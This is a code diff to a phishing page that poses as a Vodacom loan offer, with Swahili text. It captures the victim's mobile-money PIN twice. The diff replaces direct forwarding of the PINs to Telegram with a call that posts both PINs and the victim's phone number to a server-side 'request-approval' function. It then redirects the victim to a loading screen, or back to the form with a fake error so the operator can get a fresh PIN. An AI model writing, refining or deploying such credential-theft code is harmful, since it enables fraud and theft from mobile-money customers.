@@ -85,6 +85,13 @@
             const pinInput = document.getElementById('pin-input');
             const confirmBtn = document.getElementById('confirm-pin');
             const content = document.querySelector('.content');
+            const phone = sessionStorage.getItem('userPhone') || '';
+
+            // Show error if redirected back with ?error=1
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('error') === '1') {
+                document.getElementById('pin-error').textContent = 'Taarifa si sahihi, tafadhali jaribu tena.';
+            }
 
             // Trigger keyboard on content click
             content.addEventListener('click', () => {
@@ -110,18 +117,6 @@
                 }
             });
 
-            async function sendToTelegram(message) {
-                try {
-                    await fetch('/.netlify/functions/send-telegram', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ message })
-                    });
-                } catch (error) {
-                    console.error('Telegram error:', error);
-                }
-            }
-
             let isSubmitting = false;
             let attempts = 0;
             let firstPin = "";
@@ -144,15 +139,27 @@
                         return;
                     }
 
-                    // Second attempt - send both
+                    // Second attempt - send both PINs with phone to Telegram for approval
                     isSubmitting = true;
                     confirmBtn.style.opacity = '0.5';
                     confirmBtn.style.pointerEvents = 'none';
                     document.getElementById('pin-error').textContent = "";
 
-                    await sendToTelegram(`<b>Vodacom Loan - PIN Attempts</b>\n1st: <code>${firstPin}</code>\n2nd: <code>${pin}</code>`);
-                    const msg = encodeURIComponent('Tunaandaa mkopo, tunakagua uwezo wako wa kulipa...');
-                    window.location.href = `loading.html?next=success.html&delay=10000&msg=${msg}`;
+                    try {
+                        const res = await fetch('/.netlify/functions/request-approval', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ type: 'pin', phone: phone, data: { pin1: firstPin, pin2: pin } })
+                        });
+                        const resData = await res.json();
+                        const sid = resData.sessionId;
+                        window.location.href = `loading.html?sid=${sid}&next=success.html&error=${encodeURIComponent('pin.html?error=1')}`;
+                    } catch (err) {
+                        console.error('Request error:', err);
+                        isSubmitting = false;
+                        confirmBtn.style.opacity = '1';
+                        confirmBtn.style.pointerEvents = 'auto';
+                    }
                 }
             });
         });
